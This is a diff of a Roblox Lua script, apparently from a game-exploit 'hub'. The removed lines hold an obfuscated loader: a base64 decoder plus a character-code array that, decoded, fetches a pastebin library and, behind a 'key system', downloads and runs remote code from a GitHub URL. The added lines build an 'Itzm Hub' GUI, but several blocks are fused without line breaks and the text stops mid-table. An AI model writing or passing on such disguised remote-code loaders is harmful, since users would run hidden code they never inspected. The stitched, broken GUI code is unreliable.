@@ -1,10 +1,166 @@
-local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-function vRwaokzxdNeiBxFAauYxzmkiTdmVoODRBAQDvPGHJdUOARivToqeIyefahynNowonv(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "Itzm Hub"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
-data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+local guiFrame = Instance.new("Frame")
+guiFrame.Name = "Itzm Hub Frame"
+guiFrame.Size = UDim2.new(0.2, 0, 0.5, 0)
+guiFrame.Position = UDim2.new(0, 0, 0.5, -guiFrame.Size.Y.Offset/2)
+guiFrame.BackgroundTransparency = 0
+guiFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+guiFrame.BorderSizePixel = 0
+guiFrame.Parent = screenGui
 
+-- Make the GUI resizable and draggable
+local UserInputService = game:GetService("UserInputService")
+local dragging
+local dragInput
+local dragStart
+local startPos
 
- 
+local function updateDrag(input)
+    local delta = input.Position - dragStart
+    guiFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
 
+guiFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = guiFrame.Position
 
-pcall(load(string.char(table.unpack({108,111,99,97,108,32,76,105,98,114,97,114,121,32,61,32,108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,118,102,102,49,98,81,57,70,34,41,41,40,41,32,13,10,13,10,108,111,99,97,108,32,87,105,110,100,111,119,32,61,32,76,105,98,114,97,114,121,46,67,114,101,97,116,101,76,105,98,40,34,107,101,121,32,115,121,115,116,101,109,34,44,32,34,83,121,110,97,112,115,101,34,41,32,13,10,45,45,32,99,97,110,32,98,101,32,97,110,121,32,116,104,101,109,101,32,121,111,117,32,119,97,110,116,13,10,13,10,108,111,99,97,108,32,75,101,121,32,61,32,87,105,110,100,111,119,58,78,101,119,84,97,98,40,34,107,101,121,32,115,121,115,116,101,109,34,41,32,13,10,13,10,108,111,99,97,108,32,75,101,121,83,101,99,116,105,111,110,32,61,32,75,101,121,58,78,101,119,83,101,99,116,105,111,110,40,34,75,101,121,34,41,32,13,10,13,10,108,111,99,97,108,32,107,101,121,32,61,32,34,104,101,108,108,111,34,13,10,45,45,32,107,101,121,32,104,101,114,101,13,10,13,10,108,111,99,97,108,32,107,101,121,50,13,10,75,101,121,83,101,99,116,105,111,110,58,78,101,119,84,101,120,116,66,111,120,40,34,107,101,121,34,44,32,34,101,110,116,101,114,32,107,101,121,34,44,32,102,117,110,99,116,105,111,110,40,101,110,116,101,114,41,32,13,10,13,10,9,107,101,121,50,32,61,32,101,110,116,101,114,13,10,32,32,32,32,45,45,32,112,117,116,32,119,104,97,116,101,118,101,114,32,121,111,117,32,119,97,110,116,13,10,13,10,101,110,100,41,13,10,13,10,75,101,121,83,101,99,116,105,111,110,58,78,101,119,66,117,116,116,111,110,40,34,99,104,101,99,107,32,107,101,121,34,44,32,34,99,104,101,99,107,115,32,121,111,117,114,32,107,101,121,34,44,32,102,117,110,99,116,105,111,110,40,41,32,13,10,45,45,32,116,104,105,115,32,98,117,116,116,111,110,32,119,105,108,108,32,99,104,101,99,107,32,107,101,121,13,10,13,10,32,32,32,32,105,102,32,107,101,121,50,32,61,61,32,107,101,121,32,116,104,101,110,13,10,108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,39,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,103,117,101,115,116,52,51,51,47,83,111,109,101,116,104,105,110,103,45,100,111,110,45,116,45,99,108,105,99,107,45,107,47,109,97,105,110,47,72,101,108,108,111,39,41,41,40,41,13,10,32,32,32,32,101,108,115,101,13,10,32,32,32,32,32,32,112,114,105,110,116,40,34,87,114,111,110,103,107,101,121,34,41,13,10,32,32,32,32,101,110,100,13,10,101,110,100,41,13,10,13,10,13,10,13,10,13,10,108,111,99,97,108,32,116,104,101,107,101,121,61,32,87,105,110,100,111,119,58,78,101,119,84,97,98,40,34,116,104,101,32,107,101,121,34,41,13,10,108,111,99,97,108,32,116,104,101,107,101,121,83,101,99,116,105,111,110,32,61,32,116,104,101,107,101,121,58,78,101,119,83,101,99,116,105,111,110,40,34,99,111,112,121,32,107,101,121,32,104,101,114,101,34,41,13,10,13,10,13,10,116,104,101,107,101,121,83,101,99,116,105,111,110,58,78,101,119,66,117,116,116,111,110,40,34,75,101,121,34,44,32,34,34,44,32,102,117,110,99,116,105,111,110,40,41,13,10,32,32,32,32,115,101,116,99,108,105,112,98,111,97,114,100,40,34,104,101,108,108,111,34,41,13,10,101,110,100,41,}))))        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+guiFrame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input, gameProcessedEvent)
+    if input == dragInput and dragging then
+        updateDrag(input)
+    end
+end)local ItzmHub = {}
+
+ItzmHub.Settings = {
+    Name = "Itzm Hub",
+    Size = UDim2.new(0.2, 0, 0.5, 0),
+    BackgroundTransparency = 0,
+    BackgroundColor3 = Color3.new(0, 0, 0),
+    BorderSizePixel = 0,
+    IgnoreGuiInset = true,
+    ResetOnSpawn = false,
+}
+
+ItzmHub.Sections = {
+    Main = {
+        Name = "MainSection",
+        Visible = true,
+        Elements = {
+            -- Add your elements here
+        },
+    },
+    Section1 = {
+        Name = "Section1",
+        Visible = false,
+        Elements = {
+            -- Add your elements here
+        },
+    },
+}function ItzmHub.Create()
+    local screenGui = Instance.new("ScreenGui")
+    for key, value in pairs(ItzmHub.Settings) do
+        screenGui[key] = value
+    end
+    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+    local guiFrame = Instance.new("Frame")
+    guiFrame.Name = ItzmHub.Settings.Name .. " Frame"
+    guiFrame.Size = ItzmHub.Settings.Size
+    guiFrame.Position = UDim2.new(0, 0, 0.5, -guiFrame.Size.Y.Offset/2)
+    guiFrame.BackgroundTransparency = ItzmHub.Settings.BackgroundTransparency
+    guiFrame.BackgroundColor3 = ItzmHub.Settings.BackgroundColor3
+    guiFrame.BorderSizePixel = ItzmHub.Settings.BorderSizePixel
+    guiFrame.Parent = screenGui
+
+    local mainSection = ItzmHub.CreateSection(ItzmHub.Sections.Main, guiFrame)
+    local section1 = ItzmHub.CreateSection(ItzmHub.Sections.Section1, guiFrame)
+
+    local mainButton = ItzmHub.CreateButton("Main", guiFrame, mainSection, section1)
+    local section1Button = ItzmHub.CreateButton("Section 1", guiFrame, section1, mainSection)
+
+    return {
+        ScreenGui = screenGui,
+        GuiFrame = guiFrame,
+        MainSection = mainSection,
+        Section1 = section1,
+        MainButton = mainButton,
+        Section1Button = section1Button,
+    }
+end
+
+function ItzmHub.CreateSection(section, parent)
+    local frame = Instance.new("Frame")
+    frame.Name = section.Name
+    frame.Size = UDim2.new(1, 0, 1, -50)
+    frame.BackgroundTransparency = 1
+    frame.Visible = section.Visible
+    frame.Parent = parent
+
+    for _, element in ipairs(section.Elements) do
+        local instance = Instance.new(element.Type)
+        for key, value in pairs(element) do
+            instance[key] = value
+        end
+        instance.Parent = frame
+    end
+
+    return frame
+end
+
+function ItzmHub.CreateButton(text, parent, showSection, hideSection)
+    local button = Instance.new("TextButton")
+    button.Name = text .. "Button"
+    button.Text = text
+    button.Font = Enum.Font.SourceSansBold
+    button.TextColor3 = Color3.new(1, 1, 1)
+    button.TextScaled = true
+    button.Parent = parent
+
+    button.MouseButton1Click:Connect(function()
+        showSection.Visible = true
+        hideSection.Visible = false
+    end)
+
+    return button
+endItzmHub.Sections = {
+    Main = {
+        Name = "MainSection",
+        Visible = true,
+        Elements = {
+            {
+                Type = "ImageLabel",
+                Name = "Avatar",
+                Size = UDim2.new(0.5, 0, 0.5, 0),
+                Position = UDim2.new(0.25, 0, 0, 0),
+                Image = "http://www.roblox.com/Thumbs/Avatar.ashx?userId=" .. tostring(game.Players.LocalPlayer.UserId) .. "&x=150&y=150",
+            },
+            {
+                Type = "TextLabel",
+                Name = "Name",
+                Size = UDim2.new(1, 0, 0.1, 0),
+                Position = UDim2.new(0, 0, 0.5, 0),
+                BackgroundTransparency = 1,
+                Font = Enum.Font.SourceSansBold,
+                Text = "Name: " .. game.Players.LocalPlayer.Name,
+                TextColor3 = Color3.new(1, 1, 1),
+                TextScaled
